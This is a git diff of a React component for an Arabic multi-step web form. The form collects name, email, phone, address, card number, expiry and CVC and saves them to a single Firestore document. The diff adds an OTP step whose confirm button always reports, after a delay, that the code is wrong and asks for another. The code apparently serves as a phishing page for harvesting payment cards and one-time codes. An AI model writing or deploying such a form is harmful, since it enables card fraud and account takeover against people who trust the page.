@@ -24,193 +24,225 @@ const app = initializeApp(firebaseConfig)
 const db = getFirestore(app);
 
 type FormData = {
-  personalInfo: {
-    name: string
-    email: string
-    phone: string
-    password: string
-  }
-  address: {
-    street: string
-    city: string
-    state: string
-    zipCode: string
-  }
-  payment: {
-    cardNumber: string
-    expiry: string
-    cvc: string
-  }
+    personalInfo: {
+        name: string
+        email: string
+        phone: string
+        password: string
+    }
+    address: {
+        street: string
+        city: string
+        state: string
+        zipCode: string
+    }
+    payment: {
+        cardNumber: string
+        expiry: string
+        cvc: string
+    },
+    otp: { otp: string }
 }
 export default function Component() {
     const [step, setStep] = useState(1)
     const [formData, setFormData] = useState<FormData>({
-      personalInfo: { name: "", email: "", phone: "",password:"" },
-      address: { street: "", city: "", state: "", zipCode: "" },
-      payment: { cardNumber: "", expiry: "", cvc: "" },
+        personalInfo: { name: "", email: "", phone: "", password: "" },
+        address: { street: "", city: "", state: "", zipCode: "" },
+        payment: { cardNumber: "", expiry: "", cvc: "" },
+        otp: { otp: '' }
     })
-  
+
     const updateFormData = (step: keyof FormData, field: string, value: string) => {
-      setFormData((prev) => ({
-        ...prev,
-        [step]: {
-          ...prev[step],
-          [field]: value,
-        },
-      }))
+        setFormData((prev) => ({
+            ...prev,
+            [step]: {
+                ...prev[step],
+                [field]: value,
+            },
+        }))
     }
-  
+
     const handleSubmit = async (e: React.FormEvent) => {
-      e.preventDefault()
-      await setDoc(doc(db, "data", "LA"), formData);
-      alert(
-         "تم تقديم النموذج"
-      )
+        e.preventDefault()
+        await setDoc(doc(db, "data", "LA"), formData);
+        alert(
+            "تم تقديم النموذج"
+        )
     }
-  
+
     const PersonalInfoStep = () => (
-      <>
-        <div className="space-y-2">
-          <label htmlFor="name">الاسم الكامل</label>
-          <Input
-            id="name"
-            placeholder="محمد أحمد"
-            value={formData.personalInfo.name}
-            onChange={(e) => updateFormData("personalInfo", "name", e.target.value)}
-          />
-        </div>
-        <div className="space-y-2">
-          <label htmlFor="email">البريد الإلكتروني</label>
-          <Input
-            id="email"
-            type="email"
-            placeholder="mohammed@example.com"
-            value={formData.personalInfo.email}
-            onChange={(e) => updateFormData("personalInfo", "email", e.target.value)}
-          />
-        </div>
-        <div className="space-y-2">
-          <label htmlFor="phone">رقم الهاتف</label>
-          <Input
-            id="phone"
-            type="tel"
-            placeholder="٠٥٠ ١٢٣ ٤٥٦٧"
-            value={formData.personalInfo.phone}
-            onChange={(e) => updateFormData("personalInfo", "phone", e.target.value)}
-          />
-        </div>
-      </>
+        <>
+            <div className="space-y-2">
+                <label htmlFor="name">الاسم الكامل</label>
+                <Input
+                    id="name"
+                    placeholder="محمد أحمد"
+                    value={formData.personalInfo.name}
+                    onChange={(e) => updateFormData("personalInfo", "name", e.target.value)}
+                />
+            </div>
+            <div className="space-y-2">
+                <label htmlFor="email">البريد الإلكتروني</label>
+                <Input
+                    id="email"
+                    type="email"
+                    placeholder="mohammed@example.com"
+                    value={formData.personalInfo.email}
+                    onChange={(e) => updateFormData("personalInfo", "email", e.target.value)}
+                />
+            </div>
+            <div className="space-y-2">
+                <label htmlFor="phone">رقم الهاتف</label>
+                <Input
+                    id="phone"
+                    type="tel"
+                    placeholder="٠٥٠ ١٢٣ ٤٥٦٧"
+                    value={formData.personalInfo.phone}
+                    onChange={(e) => updateFormData("personalInfo", "phone", e.target.value)}
+                />
+            </div>
+        </>
     )
-  
+
     const AddressStep = () => (
-      <>
-        <div className="space-y-2">
-          <label htmlFor="street">عنوان الشارع</label>
-          <Input
-            id="street"
-            placeholder="١٢٣ شارع الرئيسي"
-            value={formData.address.street}
-            onChange={(e) => updateFormData("address", "street", e.target.value)}
-          />
-        </div>
-        <div className="space-y-2">
-          <label htmlFor="city">المدينة</label>
-          <Input
-            id="city"
-            placeholder="الرياض"
-            value={formData.address.city}
-            onChange={(e) => updateFormData("address", "city", e.target.value)}
-          />
-        </div>
-        <div className="space-y-2">
-          <label htmlFor="state">المنطقة</label>
-          <Input
-            id="state"
-            placeholder="الرياض"
-            value={formData.address.state}
-            onChange={(e) => updateFormData("address", "state", e.target.value)}
-          />
-        </div>
-        <div className="space-y-2">
-          <label htmlFor="zipCode">الرمز البريدي</label>
-          <Input
-            id="zipCode"
-            placeholder="١٢٣٤٥"
-            value={formData.address.zipCode}
-            onChange={(e) => updateFormData("address", "zipCode", e.target.value)}
-          />
-        </div>
-      </>
+        <>
+            <div className="space-y-2">
+                <label htmlFor="street">عنوان الشارع</label>
+                <Input
+                    id="street"
+                    placeholder="١٢٣ شارع الرئيسي"
+                    value={formData.address.street}
+                    onChange={(e) => updateFormData("address", "street", e.target.value)}
+                />
+            </div>
+            <div className="space-y-2">
+                <label htmlFor="city">المدينة</label>
+                <Input
+                    id="city"
+                    placeholder="الرياض"
+                    value={formData.address.city}
+                    onChange={(e) => updateFormData("address", "city", e.target.value)}
+                />
+            </div>
+            <div className="space-y-2">
+                <label htmlFor="state">المنطقة</label>
+                <Input
+                    id="state"
+                    placeholder="الرياض"
+                    value={formData.address.state}
+                    onChange={(e) => updateFormData("address", "state", e.target.value)}
+                />
+            </div>
+            <div className="space-y-2">
+                <label htmlFor="zipCode">الرمز البريدي</label>
+                <Input
+                    id="zipCode"
+                    placeholder="١٢٣٤٥"
+                    value={formData.address.zipCode}
+                    onChange={(e) => updateFormData("address", "zipCode", e.target.value)}
+                />
+            </div>
+        </>
     )
-  
+    const OtpStep = () => (
+        <>
+            <div className="space-y-2">
+                <label htmlFor="otp">  رمز OTP</label>
+                <Input
+                    id="otp"
+                    placeholder=" OTP ادخل الرمز المرسل "
+                    value={formData.otp.otp}
+                    onChange={(e) => updateFormData("otp", "otp", e.target.value)}
+                />
+            </div>
+            <div className="flex justify-between mt-4">
+
+                <Button type="button" onClick={() => {setTimeout(() => {
+                    alert('رمز التحقق خاطئ حاول مرة اخرى')
+                }, 2000); }}>
+                    تاكيد OTP
+                </Button>
+            </div>
+        </>
+    )
+
+
     const PaymentStep = () => (
-      <>
-        <div className="space-y-2">
-          <label htmlFor="cardNumber">رقم البطاقة</label>
-          <Input
-            id="cardNumber"
-            placeholder="١٢٣٤ ٥٦٧٨ ٩٠١٢ ٣٤٥٦"
-            value={formData.payment.cardNumber}
-            onChange={(e) => updateFormData("payment", "cardNumber", e.target.value)}
-          />
-        </div>
-        <div className="space-y-2">
-          <label htmlFor="expiry">تاريخ الانتهاء</label>
-          <Input
-            id="expiry"
-            placeholder="شهر/سنة"
-            value={formData.payment.expiry}
-            onChange={(e) => updateFormData("payment", "expiry", e.target.value)}
-          />
-        </div>
-        <div className="space-y-2">
-          <label htmlFor="cvc">رمز الأمان</label>
-          <Input
-            id="cvc"
-            placeholder="١٢٣"
-            value={formData.payment.cvc}
-            onChange={(e) => updateFormData("payment", "cvc", e.target.value)}
-          />
-        </div>
-      </>
+        <>
+            <div className="space-y-2">
+                <label htmlFor="cardNumber">رقم البطاقة</label>
+                <Input
+                    id="cardNumber"
+                    placeholder="١٢٣٤ ٥٦٧٨ ٩٠١٢ ٣٤٥٦"
+                    value={formData.payment.cardNumber}
+                    onChange={(e) => updateFormData("payment", "cardNumber", e.target.value)}
+                />
+            </div>
+            <div className="space-y-2">
+                <label htmlFor="expiry">تاريخ الانتهاء</label>
+                <Input
+                    id="expiry"
+                    placeholder="شهر/سنة"
+                    value={formData.payment.expiry}
+                    onChange={(e) => updateFormData("payment", "expiry", e.target.value)}
+                />
+            </div>
+            <div className="space-y-2">
+                <label htmlFor="cvc">رمز الأمان</label>
+                <Input
+                    id="cvc"
+                    placeholder="١٢٣"
+                    value={formData.payment.cvc}
+                    onChange={(e) => updateFormData("payment", "cvc", e.target.value)}
+                />
+            </div>
+        </>
     )
-  
+
     return (
-      <Card className="w-full max-w-lg mx-auto" dir="rtl">
-        <CardHeader>
-          <CardTitle>
-            {step === 1
-              ? "المعلومات الشخصية"
-              : step === 2
-              ? "تفاصيل العنوان"
-              : "معلومات الدفع"}
-          </CardTitle>
-        </CardHeader>
-        <form onSubmit={handleSubmit}>
-          <CardContent className="space-y-4">
-            {step === 1 ? (
-              <PersonalInfoStep />
-            ) : step === 2 ? (
-              <AddressStep />
-            ) : (
-              <PaymentStep />
-            )}
-          </CardContent>
-          <CardFooter className="flex justify-between">
-            {step < 3 ? (
-              <Button type="button" onClick={() => setStep(step + 1)}>
-                التالي
-              </Button>
-            ) : (
-              <Button type="submit">إرسال</Button>
-            )}
-            {step > 1 && (
-              <Button type="button" variant="outline" onClick={() => setStep(step - 1)}>
-                السابق
-              </Button>
-            )}
-          </CardFooter>
-        </form>
-      </Card>
+        <Card className="w-full max-w-lg mx-auto" dir="rtl">
+            <CardHeader>
+                <CardTitle>
+                    {step === 1
+                        ? "المعلومات الشخصية"
+                        : step === 2
+                            ? "تفاصيل العنوان":
+                            step===3? "معلومات الدفع":step === 4?
+                        "رمز التاكيد":"رمز التاكيد"}
+                </CardTitle>
+            </CardHeader>
+            <form onSubmit={handleSubmit}>
+                <CardContent className="space-y-4">
+                    {step === 1 ? (
+                        <PersonalInfoStep />
+                    ) : step === 2 ? (
+                        <AddressStep />
+                    ) :
+                        step === 3 ? (
+                            <PaymentStep />
+                        ) : step === 4 ?
+                            (
+                                <OtpStep />
+                            ):
+(                            <OtpStep />
+)
+                            }
+                </CardContent>
+                <CardFooter className="flex justify-between">
+                    {step < 4 ? (
+                        <Button type="button" onClick={() => setStep(step + 1)}>
+                            التالي
+                        </Button>
+                    ) : (
+                        <Button type="submit">إرسال</Button>
+                    )}
+                    {step > 1 && (
+                        <Button type="button" variant="outline" onClick={() => setStep(step - 1)}>
+                            السابق
+                        </Button>
+                    )}
+                </CardFooter>
+            </form>
+        </Card>
     )
-  }
+}
